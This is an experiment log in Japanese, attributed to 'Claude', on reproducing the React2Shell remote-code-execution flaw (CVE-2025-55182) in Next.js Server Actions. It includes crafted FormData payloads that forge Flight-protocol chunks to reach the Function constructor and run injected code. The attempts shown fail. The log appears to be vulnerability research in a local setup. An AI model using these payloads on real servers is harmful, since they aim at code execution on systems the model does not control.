# $B (Blob参照) 実験記録

**作成日**: 2025-12-11
**目的**: `$B<hex>`構文を使った依存関係ブロッキング回避の検証

---

## 背景

ユーザーからの重要なヒント：
> `$B1`みたいな参照方式がうまくいくみたいよ

### $B構文の仕組み

ソースコード (`react-server-dom-webpack-server.node.development.js:3130-3134`):

```javascript
case "B":
  return (
    (obj = parseInt(value.slice(2), 16)),
    response._formData.get(response._prefix + obj)  // FormDataから直接取得！
  );
```

**重要な違い**:
- `$@<hex>`: `getChunk(response, id)` → チャンクオブジェクトを返す（依存関係解決が必要）
- `$B<hex>`: `response._formData.get(response._prefix + id)` → **FormDataから直接取得**（依存関係解決なし！）

### Chunkの構造

```typescript
type Chunk<T> = {
  status: Status,  // 'pending' | 'blocked' | 'cyclic' | 'resolved_model' | 'fulfilled' | 'rejected'
  value: any,      // 状態によって意味が変わる
  reason: any,     // エラー or 追加情報 or StreamController
  _response: Response,
  _children: Array<Chunk<any>> | ProfilingInfo,
  then(resolve: (T) => void, reject?: (any) => void): void,
};
```

---

## 実験1: $F1 + $B2 アプローチ

### 目的
`$@2`（チャンク参照）を`$B2`（Blob参照）に変更して、依存関係ブロッキングを回避

### 実装

```javascript
formData.append('0', '"$F1"')
formData.append('1', '{"id":"user-profile-action#constructor","bound":"$B2"}')
formData.append('2', `["${JSON.stringify(susCode).slice(1, -1)}"]`)
```

### 結果
```
TypeError: Cannot read properties of null (reading 'id')
digest: "1030806905"
```

### 分析
- `$F1`の処理は必ず`getOutlinedModel`を呼び出す
- チャンク1の処理中に`"bound":"$B2"`がパースされる
- しかし、チャンク1自体の状態が問題で、`getOutlinedModel`が`null`を返す
- `$B2`への変更だけでは不十分

---

## 実験2: 実際のServer Action IDの使用

### 発見
Next.jsのレスポンスから実際のServer Action IDを特定：

```json
{
  "id": "f8d0a40fa6a066e94156b149c35715d5876fa432",
  "bound": null,
  "name": "vulnerableAction",
  "env": "Server"
}
```

### 実装

```javascript
formData.append('1', '{"id":"f8d0a40fa6a066e94156b149c35715d5876fa432#constructor","bound":"$B2"}')
```

### 結果
```
TypeError: Cannot read properties of null (reading 'id')
digest: "1030806905"
```

### 分析
- Server Action IDが正しいかどうかは、この段階では関係ない
- 問題はもっと手前の、RSC Flightプロトコルのデシリアライゼーション段階にある

---

## 実験3: exploit-official-poc.js完全構造の模倣

### 実装

```javascript
formData.append('0', JSON.stringify('$1'))

formData.append('1', JSON.stringify({
  status: 'resolved_model',
  reason: 0,
  _response: '$4',
  value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
  then: '$2:then',
}))

formData.append('2', JSON.stringify('$@3'))
formData.append('3', JSON.stringify([]))

formData.append('4', JSON.stringify({
  _prefix: susCode,
  _formData: { get: '$3:constructor:constructor' },
  _chunks: '$2:_response:_chunks',
}))
```

### 結果
プロセスがハング（応答なし）

### サーバーログ
```
POST / 500 in 3163ms
POST / 200 in 105ms  ← 別のテストリクエストが成功
POST / 500 in 18ms
```

### 分析
- 構造は正しいが、何かが足りない
- `value`フィールドの中の`$B3`の使い方が鍵かもしれない
- `value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}'` は**JSON文字列**の中に`$B3`が含まれている

---

## 重要な発見と疑問

### $Bの使い方

exploit-official-poc.jsでは、`$B3`は以下のように使われています：

```javascript
value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
```

これは：
1. `value`は**JSON文字列**（二重エンコード）
2. その中に`$B3`が含まれている
3. `reviveModel`がこの文字列をパースする際に、`$B3`を処理する

**疑問**:
- `$B3`が指すチャンク3は`[]`（空配列）
- なぜ空配列がFunction.constructorへのアクセスに役立つのか？
- `{"then":"$B3"}`という構造の意味は？

### 依存関係ブロッキングの真の原因

前回の分析では、`"bound":"$@2"`がチャンク2への依存関係を作成し、チャンク1が`blocked`ステータスになると結論づけました。

しかし：
- `$B2`を使っても同じエラー
- exploit-official-poc.jsの完全な構造を使ってもエラー

**可能性**:
1. `$F`アプローチ自体に問題がある
2. `response._prefix`の値が期待と異なる
3. FormDataのエントリーキー形式が間違っている
4. `next-action`ヘッダーの値が重要

### next-actionヘッダー

現在使用している値:
```javascript
headers: {
  'next-action': '1',
}
```

**疑問**:
- この`'1'`は何を意味するのか？
- Server Action IDを指定すべきか？
- これが`response._prefix`に影響するか？

---

## 次のステップ

### 1. exploit-official-poc.jsのデバッグ

前回のセッションでは`Function [as get]`エラーが出ていました（成功に近かった）。
今回は`Cannot read properties of null`エラー（もっと手前で失敗）。

**調査項目**:
- 何が変わったのか？
- `require()`と`import()`の違いの影響
- サーバー状態の影響

### 2. $B参照の詳細分析

**調査項目**:
- `response._prefix`の実際の値を確認
- FormDataのキー形式（10進数 vs 16進数）
- `$B`がJSON文字列内で使われる場合の処理

### 3. next-actionヘッダーの調査

**調査項目**:
- Next.jsのソースコードで`next-action`ヘッダーがどのように使われるか
- `_prefix`との関連性
- 正しい値の形式

### 4. デバッガーによる詳細トレース

```bash
NODE_OPTIONS='--inspect-brk' pnpm dev
```

**ブレークポイント**:
- `parseModelString` (case "B"の処理)
- `response._formData.get`の呼び出し
- `response._prefix`の値

### 5. 異なる攻撃ベクトルの探索

`$F`アプローチ以外の方法:
- `$1`直接参照（Server Action呼び出しではない）
- 異なるRSC Flightプロトコルの命令
- Next.js 14.xでの検証

---

## 結論

**進捗**:
1. ✅ `$B`構文の仕組みを理解
2. ✅ FormDataから直接取得することを確認
3. ✅ 実際のServer Action IDを特定
4. ❌ 依存関係ブロッキングの回避に失敗
5. ❌ exploit-official-poc.js構造の模倣に失敗

**技術的洞察**:
- `$B`参照は依存関係解決をバイパスする可能性がある
- しかし、`$F1`の処理自体が`getOutlinedModel`を呼び出す
- チャンク1の`blocked`/`pending`ステータスが根本原因
- `value`フィールドの二重JSON エンコーディングが重要かもしれない

**推奨**:
1. exploit-official-poc.jsを元の状態（`require()`使用）でテスト
2. デバッガーで`response._prefix`の値を確認
3. `next-action`ヘッダーの詳細調査
4. Next.js 14.xでの動作検証

---

**調査担当**: Claude
**技術スタック**: Next.js 15.0.0, React 19.0.0, react-server-dom-webpack 19.0.0
**参考**: CVE-2025-55182 (React2Shell), Lachlan Davidson's original PoC
